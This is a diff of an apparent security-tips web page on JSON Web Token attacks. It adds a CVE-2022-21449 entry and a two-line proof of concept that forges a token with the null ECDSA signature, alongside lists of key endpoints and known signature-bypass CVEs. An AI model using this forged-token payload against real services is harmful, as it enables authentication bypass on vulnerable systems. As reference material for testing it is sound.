@@ -7,8 +7,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Security Tips">
 
-  
-  
+  <meta name="description" content="JWT tips">
+  <meta name="keywords" content="JWT, web, authentication">
 
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
@@ -134,17 +134,11 @@
     <ul>
             
     
-    <ul>
+
     
-        <li><a class="" href="#finding-public-keys">Finding Public Keys</a></li>
+
     
-        <li><a class="" href="#vulnerabilities">Vulnerabilities</a></li>
-    
-        <li><a class="" href="#jwt-toolkit">JWT Toolkit</a></li>
-    
-        <li><a class="" href="#exploit-in-python">Exploit in Python</a></li>
-    
-    </ul>
+
     
 
     </ul>
@@ -388,9 +382,8 @@
         <div role="main">
           <div class="section">
             
-              <h1></h1>
-              <h1 id="json-web-token">JSON Web Token</h1>
-<h2 id="finding-public-keys">Finding Public Keys</h2>
+              <h1>JSON Web Token</h1>
+              <h2 id="finding-public-keys">Finding Public Keys</h2>
 <p>Some common locations for public keys are:</p>
 <div class="clipboard-content">  <pre><code class="language-none">/api/keys
 /api/v1/keys
@@ -409,7 +402,14 @@
 <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2951" target="_blank">CVE-2015-2951</a>: The alg=none signature-bypass vulnerability in <code>JWT.php</code></li>
 <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10555" target="_blank">CVE-2016-10555</a>: The RS/HS256 public key mismatch vulnerability because the server does not enforce "algorithm"</li>
 <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114" target="_blank">CVE-2018-0114</a>: It's possible to re-sign a token using a key that is embedded within the token</li>
+<li><a href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/" target="_blank">CVE-2022-21449</a> : bypass signature checks using ECDSA signatures with point (0, 0)</li>
 </ul>
+<p>PoC from <a href="https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/jwt-null-signature-vulnerable-app" target="_blank">DataDog/security-labs-pocs</a>:</p>
+<div class="clipboard-content">  <pre><code class="language-python">payload = 'eyJz....'
+jwt = f'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.{payload}.MAYCAQACAQA'
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="payload = 'eyJz....'
+jwt = f'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.{payload}.MAYCAQACAQA'
+">    Copy  </button></div></div>
 <h2 id="jwt-toolkit">JWT Toolkit</h2>
 <div class="clipboard-content">  <pre><code class="language-bash">jwt_tool.py is a toolkit for validating, forging and cracking JWTs (JSON Web Tokens).
 </code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="jwt_tool.py is a toolkit for validating, forging and cracking JWTs (JSON Web Tokens).
